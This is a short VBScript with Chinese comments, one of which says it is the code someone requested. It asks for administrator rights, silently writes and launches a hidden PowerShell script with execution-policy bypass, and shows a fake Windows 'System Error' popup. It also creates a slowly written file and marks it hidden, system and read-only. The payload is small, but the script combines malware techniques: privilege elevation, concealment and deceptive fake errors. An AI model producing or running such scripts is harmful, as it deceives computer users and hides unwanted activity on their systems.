' --- 1. 自动请求管理员权限 ---
Set objShell = CreateObject("Shell.Application")
If Not WScript.Arguments.Named.Exists("elevate") Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
    WScript.Quit
End If

Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' --- 2. 定义生成的脚本路径 ---
psPath = "D:\Safety_Test.ps1"

' --- 3. 写入内容 (这部分就是你要求的完整代码) ---
Set psFile = fso.CreateTextFile(psPath, True)
psFile.WriteLine "$TargetDir = " & Chr(34) & "D:\" & Chr(34)
psFile.WriteLine "$BigFile = Join-Path $TargetDir " & Chr(34) & "core_dump.txt" & Chr(34)
psFile.WriteLine "if (!(Test-Path $TargetDir)) { New-Item $TargetDir -ItemType Directory -Force | Out-Null }"
psFile.WriteLine "Add-Type -AssemblyName PresentationFramework"
psFile.WriteLine "$Popup = [powershell]::Create().AddScript({ [System.Windows.MessageBox]::Show('Windows Version Error: build 23H2 incompatible.', 'System Error', 0, 16) })"
psFile.WriteLine "$null = $Popup.BeginInvoke()"
psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
psFile.WriteLine "$Buffer = New-Object Byte[] 1"
psFile.WriteLine "for($i=1; $i -le 1024; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 55 }"
psFile.WriteLine "$Stream.Close()"
psFile.WriteLine "attrib +h +s +r $BigFile"
psFile.Close

' --- 4. 强力隐藏脚本本身 ---
Set f = fso.GetFile(psPath)
f.Attributes = 2 + 4

' --- 5. 静默启动 ---
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & psPath, 0, False

Set fso = Nothing
Set WshShell = Nothing
